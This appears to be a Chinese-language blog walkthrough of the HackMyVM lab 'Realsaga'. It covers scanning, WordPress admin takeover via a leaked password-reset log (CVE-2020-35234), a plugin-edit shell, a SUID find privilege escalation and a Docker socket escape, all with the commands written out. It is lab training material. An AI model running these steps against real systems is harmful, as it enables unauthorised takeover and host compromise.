{"pageProps":{"postData":{"id":"HackMyVMRealsaga","contentHtml":"<h1>Realsaga.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Realsaga\">https://hackmyvm.eu/machines/machine.php?vm=Realsaga</a></p>\n</blockquote>\n<p><img src=\"/post-images/HackMyVMRealsaga/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<p>端口扫描</p>\n<pre><code class=\"hljs language-bash\">➜  Realsaga nmap -sP 192.168.56.0/24   \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-12-15 15:42 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.000091s latency).\nMAC Address: 0A:00:27:00:00:05 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.100\nHost is up (0.000047s latency).\nMAC Address: 08:00:27:41:E9:5B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.107\nHost is up (0.00017s latency).\nMAC Address: 08:00:27:ED:38:EC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.102\nHost is up.\nNmap <span class=\"hljs-keyword\">done</span>: 256 IP addresses (4 hosts up) scanned <span class=\"hljs-keyword\">in</span> 1.80 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Realsaga nmap -p- -n -Pn -sV 192.168.56.107 -min-rate 10000\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-12-15 15:43 CST\nStats: 0:01:55 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan\nService scan Timing: About 50.00% <span class=\"hljs-keyword\">done</span>; ETC: 15:46 (0:01:54 remaining)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.107\nHost is up (0.000060s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n25/tcp open  smtp?\n80/tcp open  http    Apache httpd 2.4.29\nMAC Address: 08:00:27:ED:38:EC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nService Info: Host: localhost\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 173.42 seconds\n</code></pre>\n<p>枚举 <code>HTTP</code> 服务</p>\n<p><img src=\"/post-images/HackMyVMRealsaga/image1.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">➜  Realsaga whatweb http://saga.local    \nhttp://saga.local [200 OK] Apache[2.4.29], Bootstrap[6.1.1], Cookies[_wpas_session], Country[RESERVED][ZZ], Email[info@netwire.loca,info@netwire.local], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[192.168.56.107], JQuery[3.2.1], MetaGenerator[Powered by Slider Revolution 6.3.2 - responsive, Mobile-Friendly Slider Plugin <span class=\"hljs-keyword\">for</span> WordPress with comfortable drag and drop interface.,Powered by WPBakery Page Builder - drag and drop page builder <span class=\"hljs-keyword\">for</span> WordPress.,WordPress 6.1.1], PoweredBy[Slider,WPBakery], Script[text/html,text/javascript], Title[SAGA Helthcare &#x26;#8211; We Take care of your helth!], UncommonHeaders[<span class=\"hljs-built_in\">link</span>], WordPress[6.1.1], Wordpress-Contact-Form[7.5.4.1]\n</code></pre>\n<ul>\n<li><strong>操作系统/Web服务器</strong>: Ubuntu Linux 上的 Apache 2.4.29。</li>\n<li><strong>CMS (内容管理系统)</strong>: <strong>WordPress 6.1.1</strong>。这是一个相对较新的版本（2022年底发布），但这并不意味着它是安全的，重点应放在插件上。</li>\n<li><strong>IP 地址</strong>: <code>192.168.56.107</code> (这通常是 VirtualBox Host-Only 网络的地址)。</li>\n</ul>\n<hr>\n<p>上 wpscan，能扫出来很多漏洞，但是太多了，挑了几个 RCE 的漏洞进行测试，但是资料很少，并且一般是要登录后用于权限提升的</p>\n<pre><code class=\"hljs language-bash\">.... 太长了不放\n</code></pre>\n<p>记得群里之前有个老哥打 <code>wordpress</code> 用的是 nuclei，并且速度比 <code>wpscan</code> 还快，这里也尝试一下</p>\n<p>扫出来两个漏洞 <code>CVE-2023-5561</code> 以及 <code>CVE-2020-35234</code></p>\n<pre><code class=\"hljs language-bash\">➜  Realsaga nuclei -target http://saga.local -t ~/Desktop/Tools/nuclei/nuclei-templates-10.3.5/http/cves\n\n                     __     _\n   ____  __  _______/ /__  (_)\n  / __ \\/ / / / ___/ / _ \\/ /\n / / / / /_/ / /__/ /  __/ /\n/_/ /_/\\__,_/\\___/_/\\___/_/   v3.6.0\n\n                projectdiscovery.io\n\n[INF] Current nuclei version: v3.6.0 (latest)\n[INF] Current nuclei-templates version: v10.3.5 (latest)\n[INF] New templates added <span class=\"hljs-keyword\">in</span> latest release: 57\n[INF] Templates loaded <span class=\"hljs-keyword\">for</span> current scan: 3518\n[INF] Executing 3518 signed templates from projectdiscovery/nuclei-templates\n[INF] Targets loaded <span class=\"hljs-keyword\">for</span> current scan: 1\n[INF] Templates clustered: 32 (Reduced 24 Requests)\n[INF] Using Interactsh Server: oast.fun\n[CVE-2023-5561] [http] [medium] http://saga.local/?rest_route=/wp/v2/users&#x26;search=@ [route=<span class=\"hljs-string\">\"?rest_route=/wp/v2/users&#x26;\"</span>]\n[CVE-2020-35234] [http] [high] http://saga.local/wp-content/plugins/easy-wp-smtp/\n[INF] Scan completed <span class=\"hljs-keyword\">in</span> 36.863887627s. 2 matches found.\n</code></pre>\n<h2>CVE-2020-35234</h2>\n<blockquote>\n<p>WordPress 的 easy-wp-smtp 插件 1.4.4 之前的版本存在管理员账户被盗用的风险，该漏洞已于 2020 年 12 月被公开利用。如果攻击者能够访问 <code>wp-content/plugins/easy-wp-smtp/</code> 目录，就能找到一个日志文件（例如 #############_debug_log.txt），其中包含所有密码重置链接。攻击者可以请求重置管理员密码，然后利用日志文件中找到的链接进行攻击。</p>\n</blockquote>\n<p>正好可以进行访问</p>\n<p><img src=\"/post-images/HackMyVMRealsaga/image2.png\" alt=\"image.png\"></p>\n<p>寻找管理员邮箱</p>\n<p><img src=\"/post-images/HackMyVMRealsaga/image3.png\" alt=\"image.png\"></p>\n<p>在忘记密码页面测试之后，发现 <code>admin@netwire.local</code> 邮箱是存在的</p>\n<p><img src=\"/post-images/HackMyVMRealsaga/image4.png\" alt=\"image.png\"></p>\n<p>刷新日志文件，得到重置密码链接</p>\n<p><img src=\"/post-images/HackMyVMRealsaga/image5.png\" alt=\"image.png\"></p>\n<p>重置密码后，可以正常进行登录进入后台</p>\n<p><img src=\"/post-images/HackMyVMRealsaga/image6.png\" alt=\"image.png\"></p>\n<p>到后台就是标准的后台 <code>GetShell</code> 了，写插件弹 <code>shell</code></p>\n<p>这里修改 <strong>Akismet Anti-Spam</strong> 插件</p>\n<p><img src=\"/post-images/HackMyVMRealsaga/image7.png\" alt=\"image.png\"></p>\n<p>修改上传后，点击启用即可</p>\n<p><img src=\"/post-images/HackMyVMRealsaga/image8.png\" alt=\"image.png\"></p>\n<h2>提权</h2>\n<h3>信息收集</h3>\n<p>进来后，我们能发现我们在容器里面</p>\n<pre><code class=\"hljs language-bash\">www-data@saga:/var/www/html/wp-admin$ ip add\n1: lo: &#x3C;LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    <span class=\"hljs-built_in\">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n4: eth0@if5: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default \n    <span class=\"hljs-built_in\">link</span>/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0\n       valid_lft forever preferred_lft forever\n</code></pre>\n<p>可以读 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">www-data@saga:/home/dev$ <span class=\"hljs-built_in\">cat</span> user.txt \nad7338854b85303c222cbbf3d4290353\n</code></pre>\n<p>查看特殊权限文件</p>\n<pre><code class=\"hljs language-bash\">www-data@saga:/var/www$ find / -perm -u=s -<span class=\"hljs-built_in\">type</span> f 2>/dev/null\n/bin/su\n/bin/umount\n/bin/mount\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/bin/chsh\n/usr/bin/newgrp\n/usr/bin/passwd\n/usr/bin/find\n/usr/bin/chfn\n/usr/bin/gpasswd\n/usr/bin/sudo\n</code></pre>\n<p>拿到容器 <code>root</code> 权限</p>\n<pre><code class=\"hljs language-bash\">www-data@saga:/var/www$ /usr/bin/find . -<span class=\"hljs-built_in\">exec</span> /bin/bash -p \\; -quit\nbash-4.4# <span class=\"hljs-built_in\">id</span>\nuid=33(www-data) gid=33(www-data) euid=0(root) <span class=\"hljs-built_in\">groups</span>=33(www-data)\n</code></pre>\n<p>可以拿到一个假的 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">bash-4.4# <span class=\"hljs-built_in\">cat</span> root.txt \nGreat Work .... But This Is<span class=\"hljs-string\">'nt the REALSAGA Jump In And TryHarder !!!\n</span></code></pre>\n<h3>Docker 逃逸</h3>\n<p>Docker 逃逸文章：<a href=\"https://xz.aliyun.com/news/17111\">https://xz.aliyun.com/news/17111</a></p>\n<p>手动测试到 Socket 逃逸的时候发现存在 <code>Docker.saga</code> ，这里应该挂载在的是<code>docker.saga</code> 而不是 <code>docker.sock</code></p>\n<p><img src=\"/post-images/HackMyVMRealsaga/image9.png\" alt=\"image.png\"></p>\n<p>上 CDK 进行检测，提示存在</p>\n<p><img src=\"/post-images/HackMyVMRealsaga/image10.png\" alt=\"image.png\"></p>\n<p>直接用 CDK 上面的利用会提示未能获取创建容器 ID</p>\n<p>这里根据上面的文章进行手动利用，并未 Docker 客户端默认只会去连接 <code>/var/run/docker.sock</code>。\n既然该靶机将 Socket 文件重命名为了 <code>/var/run/docker.saga</code>，你需要显式地告诉 Docker 客户端去连接这个非标准路径</p>\n<p>开始逃逸</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-comment\"># docker -H unix:///var/run/docker.saga images</span>\nREPOSITORY   TAG       IMAGE ID       CREATED         SIZE\nsaga         latest    4bd60acdea69   13 months ago   1.7GB\nubuntu       18.04     f9a80a55f492   2 years ago     63.2MB\n\n<span class=\"hljs-comment\"># docker -H unix:///var/run/docker.saga run -it -v /:/tmp ubuntu:18.04 /bin/bash</span>\nroot@0b00f467a68d:/# <span class=\"hljs-built_in\">id</span>\nuid=0(root) gid=0(root) <span class=\"hljs-built_in\">groups</span>=0(root)\n</code></pre>\n<p>成功挂在到宿主机根目录，读 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">root@0b00f467a68d:/tmp/root# <span class=\"hljs-built_in\">cat</span> root.txt \n4aa171ec191d90249c0f7d28d8f589cc\n</code></pre>","title":"HackMyVM - Realsaga","date":"2025-12-16","updated":"2025-12-16","tags":["Linux","CVE-2020-35234","WordPress","Docker"],"categories":"靶机","comments":true,"description":"Realsaga. https://hackmyvm.eu/machines/machine.php?vm=Realsaga Recon 端口扫描 枚举 HTTP 服务 操作系统/Web服务器: Ubuntu Linux 上的 Apache 2.4.29。 CMS (内容管理系统): WordPre..."},"recentPosts":[{"id":"HackMyVMRealsaga","title":"HackMyVM - Realsaga","date":"2025-12-16","isEncrypted":false,"year":"2025","month":"12","day":"16"},{"id":"Machinevictorique","title":"Machine - victorique","date":"2025-12-13","isEncrypted":false,"year":"2025","month":"12","day":"13"},{"id":"TheHackersLabsKoi Stealer","title":"TheHackersLabs - Koi Stealer","date":"2025-12-06","isEncrypted":false,"year":"2025","month":"12","day":"06"},{"id":"HackMyVMSkid","title":"HackMyVM - Skid","date":"2025-12-03","isEncrypted":false,"year":"2025","month":"12","day":"03"},{"id":"群U靶机SudoHome_sunset","title":"群U靶机 - SudoHome","date":"2025-11-23","isEncrypted":false,"year":"2025","month":"11","day":"24"},{"id":"群U靶机Yibasuo","title":"群U靶机 - Yibasuo","date":"2025-11-22","isEncrypted":false,"year":"2025","month":"11","day":"24"},{"id":"HackMyVMHunter","title":"HackMyVM - Hunter","date":"2025-11-21","isEncrypted":false,"year":"2025","month":"11","day":"21"}]},"__N_SSG":true}